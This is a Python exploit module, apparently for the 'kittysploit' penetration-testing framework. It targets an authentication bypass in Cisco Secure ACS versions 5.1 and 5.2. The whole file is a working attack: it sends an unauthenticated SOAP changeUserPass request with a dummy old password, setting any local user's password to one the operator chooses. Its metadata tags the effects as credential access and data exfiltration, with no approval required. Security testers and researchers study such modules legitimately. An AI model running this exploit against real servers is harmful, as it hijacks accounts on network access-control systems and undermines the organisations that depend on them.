#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cisco Secure ACS Unauthorized Password Change"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Cisco Secure ACS Unauthorized Password Change',
        'description': 'Module exploits an authentication bypass issue which allows arbitrary password change requests to be issued for any user in the local store. Instances of Secure ACS running version 5.1 with patches 3, 4, or 5 as well as version 5.2 with either no patches or patches 1 and 2 are vulnerable.',
        'author': ['Jason Kratzer', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['http://www.cisco.com/en/US/products/csa/cisco-sa-20110330-acs.html'],
        'tags': ['iot', 'router', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(443, "Target HTTP port")
    ssl = OptBool(True, "SSL enabled: true/false")
    path = OptString("/PI/services/UCP/", "Path to UCP WebService")
    username = OptString("", "Username to use")
    password = OptString("", "Password to use")

    def run(self):
        headers = {'SOAPAction': '"changeUserPass"'}

        data = ('<?xml version="1.0" encoding="utf-8"?>' + '\r\n'
                '<SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" '
                'xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" '
                'xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" '
                'xmlns:xsd="http://www.w3.org/1999/XMLSchema">' + '\r\n'

                '<SOAP-ENV:Body>' + '\r\n'
                '<ns1:changeUserPass xmlns:ns1="UCP" SOAP-ENC:root="1">' + '\r\n'
                '<v1 xsi:type="xsd:string">' + self.username + '</v1>' + '\r\n'
                '<v2 xsi:type="xsd:string">fakepassword</v2>' + '\r\n'
                '<v3 xsi:type="xsd:string">' + self.password + '</v3>' + '\r\n'
                '</ns1:changeUserPass>'
                '</SOAP-ENV:Body>' + '\r\n'
                '</SOAP-ENV:Envelope>' + '\r\n\r\n')

        print_status("Issuing password change request for: " + self.username)

        response = self.http_request(
            method="POST",
            path=self.path,
            data=data,
            headers=headers
        )

        if response is None:
            print_error("Exploit failed. Target seems to be not vulnerable.")
            return

        if "success" in response.text:
            print_success("Success! Password for {} has been changed to {}".format(self.username, self.password))
        elif "Password has already been used" in response.text:
            print_error("Failed! The supplied password has already been used.")
            print_error("Please change the password and try again.")
        elif "Invalid credentials for user" in response.text:
            print_error("Failed! Username does not exist or target is not vulnerable.")
            print_error("Please change the username and try again.")
        else:
            print_error("Failed!  An unknown error has occurred.")
    def check(self):
        # it is not possible to verify if target is vulnerable without exploiting system
        return None
